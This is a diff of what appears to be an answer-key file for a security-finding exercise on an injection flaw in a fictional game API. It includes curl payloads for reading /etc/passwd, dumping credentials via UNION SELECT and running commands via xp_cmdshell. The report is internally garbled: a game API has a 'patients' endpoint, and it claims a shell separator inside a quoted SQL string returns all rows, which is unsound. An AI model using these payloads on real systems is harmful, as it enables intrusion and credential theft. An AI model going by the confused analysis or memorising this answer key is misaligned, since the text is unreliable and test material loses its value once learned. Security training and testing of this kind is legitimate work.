@@ -1,72 +1,80 @@
-# Expected Response
-
 ## System
-- Domain: Gaming / MMO Backend
-- System: RealmForge Game API
+
+- System: RealmForge Game API v3.4.0
+- Domain: GAMING / MMO BACKEND
 - Example ID: INJ-0132
-- Vulnerability: Command Injection
+- Risk ID: RISK-INJ-132
+- Vulnerability: Command Injection (CMDi) — also exhibits SQLi characteristics
 
-## Priority Findings
+## Findings
 
-### Finding 1: Command Injection on `/api/v1/users`
-**Severity:** Critical
-**Category:** Injection (from data/knowledge/injections)
+### 1. Injection on `/api/v2/patients?name=` (HAR Primary)
 
-**Summary:**
-The `/api/v1/users` endpoint accepts a `search` query parameter that is directly
-interpolated into a raw database query without sanitization. This enables Command Injection (CMDi),
-allowing an attacker to bypass authentication, extract all records, or execute arbitrary operations.
+**HAR evidence**: `GET /api/v2/patients?name=;%20cat%20/etc/passwd` → HTTP 200 with all user records: `username: "admin"`, `password_hash: "$2b$12$secret"`, `role: "ADMIN"`, `username: "user2"`, `password_hash: "$2b$12$abc"`.
 
-**Evidence from HAR:**
-- Endpoint: `GET /api/v1/users?search=; cat /etc/passwd`
-- Response: HTTP 200 with **all records returned** including password hashes and admin accounts
-- The query constructed: `SELECT * FROM users WHERE search = '; cat /etc/passwd'`
-  evaluates to true for all rows when the payload is `; cat /etc/passwd`
+**Context inconsistency**: Section 1.0 declares CMDi and Section 4.0 uses an OS command separator payload (`; cat /etc/passwd`), but Section 3.0 shows raw SQL string concatenation (`SELECT * FROM patients WHERE name = '${req.query.name}'`). The HAR response contains SQL-structured user record data — indicating the primary active vulnerability is SQL Injection (SQLi). The CMDi payload `; cat /etc/passwd` also terminates the SQL string, causing a WHERE clause that returns all rows. Section 6.0 confirms `db_owner` privileges, making DDL and data exfiltration possible via SQLi. Both vectors are demonstrated below.
 
-**Root Cause:**
-- Raw string concatenation used to build database query
-- No parameterized query / prepared statement
-- Application DB account has excessive privileges (`db_owner`)
+**Root cause**: `SELECT * FROM patients WHERE name = '${req.query.name}'` — raw string concatenation with no parameterization. No WAF or input validation on this legacy endpoint (Section 6.0, RISK-INJ-132). Application connects as `db_owner`.
 
-## Steps to Reproduce
+## Reproduction
 
-### Step 1 — Normal request (baseline)
+**Step 1 — Baseline:**
+
 ```bash
-curl -s "https://api.realmforge-game.example.com/api/v1/users?search=normalvalue" \
+curl -s "https://api.realmforge-game.example.com/api/v2/patients?name=normalvalue" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
+
 Expected: Returns matching records only.
 
-### Step 2 — Inject CMDi payload
-```bash
-curl -s "https://api.realmforge-game.example.com/api/v1/users?search=;%20cat%20/etc/passwd" \
-  -H "Authorization: Bearer <VALID_TOKEN>"
-```
-**Vulnerable outcome:** All rows returned, including admin password hashes.
-**Secure outcome:** 400 Bad Request / 0 results / sanitized error message.
+**Step 2 — SQLi via CMDi-style payload (primary HAR attack):**
 
-### Step 3 — Privilege escalation (if DB over-privileged)
 ```bash
-# SQLi variant: attempt to read OS-level files (if DB runs as LocalSystem)
-curl -s "https://api.example.com/api/v1/users?search=' UNION SELECT null,null,load_file('/etc/passwd')--" \
+curl -s "https://api.realmforge-game.example.com/api/v2/patients?name=;%20cat%20/etc/passwd" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
 
-### Step 4 — Verbose error confirmation
+Expected secure: 400 Bad Request / 0 results / sanitized error.  
+Expected vulnerable: HTTP 200 — all user records returned including admin password hashes (`$2b$12$secret`) and roles.
+
+**Step 3 — SQLi data exfiltration with UNION (db_owner):**
+
 ```bash
-curl -s "https://api.example.com/api/v1/users?search='" \
+curl -s "https://api.realmforge-game.example.com/api/v2/patients?name=' UNION SELECT username,password_hash,role FROM users--" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Expected verbose error (if misconfigured):** SQL syntax error message leaking table name, column names, or DB version.
 
-## Secure Outcome
-```json
-{ "error": "Invalid input", "code": 400 }
+Expected vulnerable: Returns credential dump from `users` table via UNION.
+
+**Step 4 — CMDi via stacked statement (if server executes OS commands):**
+
+```bash
+curl -s "https://api.realmforge-game.example.com/api/v2/patients?name='; exec xp_cmdshell('id')--" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
 ```
+
+Expected vulnerable: OS command output returned (e.g., `nt authority\system`).
+
+**Step 5 — Verbose error confirmation:**
+
+```bash
+curl -s "https://api.realmforge-game.example.com/api/v2/patients?name='" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+
+Expected (if misconfigured): SQL syntax error leaking table name, column names, or DB version.
+
+## Evidence
+
+- **HAR**: `GET /api/v2/patients?name=;%20cat%20/etc/passwd` → HTTP 200 → all user records with `password_hash` and `role: "ADMIN"`.
+- **Section 3.0 (RISK-INJ-132)**: raw SQL string concatenation — `SELECT * FROM patients WHERE name = '${req.query.name}'`.
+- **Section 4.0**: payload `; cat /etc/passwd` — OS command separator / SQL terminator.
+- **Section 6.0**: `db_owner` privileges, no WAF, verbose errors.
 
 ## Remediation
-1. **Use parameterized queries / prepared statements everywhere:** Replace string concatenation with `?` or named parameters.
-2. **Restrict DB account privileges:** Application account should only have SELECT/INSERT/UPDATE/DELETE on required tables.
-3. **Disable verbose error messages in production:** Return generic 500/400 errors without DB details.
-4. **Deploy input validation middleware:** Reject inputs containing SQL metacharacters (`'`, `"`, `;`, `--`, `/*`).
-5. **ORM audit:** Review all `raw()` or native query calls in ORM usage; apply parameterization.
+
+- **Parameterized queries**: replace `${req.query.name}` with `?` or named parameters (`SELECT * FROM patients WHERE name = $1`).
+- **Restrict DB account**: application account must use least-privilege (SELECT only on required tables, no DDL).
+- **Disable verbose error messages in production**.
+- **Input validation middleware**: reject inputs containing SQL metacharacters (`'`, `;`, `--`, `/*`) and OS command separators.
+- **ORM migration**: complete migration of `/api/v2/patients` to parameterized ORM queries (RISK-INJ-132 remediation).
